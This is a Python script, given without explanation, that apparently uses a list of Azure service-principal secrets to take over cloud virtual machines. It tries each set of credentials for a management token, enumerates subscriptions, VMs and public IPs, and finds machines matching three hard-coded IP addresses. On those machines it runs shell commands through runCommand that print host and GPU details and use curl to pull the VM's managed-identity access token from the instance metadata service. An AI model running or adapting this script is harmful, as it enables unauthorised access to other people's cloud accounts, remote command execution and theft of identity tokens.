import json,os,sys,time,base64,urllib.request,urllib.parse,subprocess

def post(url,data):
    req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'})
    try:
        with urllib.request.urlopen(req,timeout=30) as r: return r.status,json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code,json.loads(e.read() or b'{}')
        except Exception: return e.code,{}
    except Exception as e:
        return -1,{'error':str(e)}

def req(method,url,tok,body=None):
    h={'Authorization':'Bearer '+tok,'Content-Type':'application/json'}
    data=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,data=data,headers=h,method=method)
    try:
        with urllib.request.urlopen(r,timeout=90) as x: return x.status,json.loads(x.read() or b'{}'),dict(x.headers)
    except urllib.error.HTTPError as e:
        try: return e.code,json.loads(e.read() or b'{}'),dict(e.headers)
        except Exception: return e.code,{},dict(e.headers)
    except Exception as e:
        return -1,{'error':str(e)},{}

def log(*a):
    s=' '.join(str(x) for x in a); print(s,flush=True); OUT.append(s)

OUT=[]
seeds=base64.b64decode(os.environ['SEEDS_B64']).decode().splitlines()
triples=[]
for line in seeds:
    p=line.split('|')
    if len(p)==3 and p[0].strip(): triples.append(tuple(x.strip() for x in p))

log('TRIPLES',len(triples))
ARM=None; ARMTRIP=None
for t,c,s in triples:
    st,r=post('https://login.microsoftonline.com/%s/oauth2/v2.0/token'%t,{'client_id':c,'client_secret':s,'scope':'https://management.azure.com/.default','grant_type':'client_credentials'})
    ok='TOKEN' if r.get('access_token') else (r.get('error','')+' '+str(r.get('error_description',''))[:110])
    log('AUTH %s %s %s => %s %s'%(t,c,s[:5]+'..',st,ok))
    if r.get('access_token') and ARM is None:
        ARM=r['access_token']; ARMTRIP=(t,c)
        open('arm_token.txt','w').write(ARM)
if not ARM:
    log('NO_ARM_TOKEN')
    open('out_stage1.txt','w').write('\n'.join(OUT)+'\n')
    sys.exit(0)

log('ARM OK via',ARMTRIP)
st,r,h=req('GET','https://management.azure.com/subscriptions?api-version=2022-12-01',ARM)
subs=[s['subscriptionId'] for s in r.get('value',[])] if isinstance(r,dict) else []
log('SUBS',st,subs)
target_ips={'70.153.141.118','23.100.38.120','20.114.255.207'}
found=[]
for sub in subs:
    st,r,_=req('GET','https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01'%sub,ARM)
    vms=r.get('value',[]) if isinstance(r,dict) else []
    log('VMS',sub,st,len(vms))
    for v in vms[:200]:
        vid=v.get('id',''); nm=v.get('name'); loc=v.get('location')
        log(' VM',sub,loc,nm,vid)
    st,r,_=req('GET','https://management.azure.com/subscriptions/%s/providers/Microsoft.Network/publicIPAddresses?api-version=2024-05-01'%sub,ARM)
    pips=r.get('value',[]) if isinstance(r,dict) else []
    log('PIPS',sub,st,len(pips))
    for p in pips:
        ip=p.get('properties',{}).get('ipAddress')
        if ip:
            log(' PIP',ip,p.get('name'),p.get('id'))
            if ip in target_ips: found.append((sub,ip,p))
log('FOUND',len(found))
json.dump([{'sub':f[0],'ip':f[1],'pip':f[2]} for f in found],open('found.json','w'),default=str)

# map PIP -> NIC -> VM
def resolve(sub,pip):
    pid=pip['id']
    st,r,_=req('GET','https://management.azure.com%s?api-version=2024-05-01'%pid,ARM)
    cfg=r.get('properties',{}).get('ipConfiguration',{}) if isinstance(r,dict) else {}
    nicid=cfg.get('id','')
    log('  PIPCFG',nicid[:160])
    if '/networkInterfaces/' in nicid:
        nicpath=nicid.split('/ipConfigurations/')[0]
        st,r,_=req('GET','https://management.azure.com%s?api-version=2024-05-01'%nicpath,ARM)
        vm=r.get('properties',{}).get('virtualMachine',{}).get('id','') if isinstance(r,dict) else ''
        log('  NIC->VM',vm)
        return vm
    return ''

def runcmd(sub,vm,rg,name):
    url='https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/virtualMachines/%s/runCommand?api-version=2024-07-01'%(sub,rg,name)
    script=["id; hostname; hostname -I; nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,serial,uuid --format=csv,noheader 2>/dev/null",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
            "curl -s -m 10 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"]
    st,r,h=req('POST',url,ARM,{'commandId':'RunShellScript','script':script})
    log('RUNCMD POST',st,str(r)[:200])
    loc=h.get('Location') or h.get('location') or ''
    log(' LOC',loc)
    for i in range(30):
        if not loc: break
        time.sleep(6)
        st,r2,_=req('GET',loc+'?api-version=2024-07-01',ARM)
        s=str(r2)[:400]
        log(' POLL',i,st,s)
        if 'Succeeded' in s or 'Failed' in s:
            for e in r2.get('properties',{}).get('output',{}).get('value',[]):
                log(' OUT',e.get('code'),e.get('message'))
            break

cwd=os.getcwd()
for sub,ip,pip in found:
    vm=resolve(sub,pip)
    if vm:
        parts=vm.split('/')
        rg=parts[4]; name=parts[-1]
        log('TARGET',ip,rg,name)
        runcmd(sub,vm,rg,name)

open('out_stage1.txt','w').write('\n'.join(OUT)+'\n')
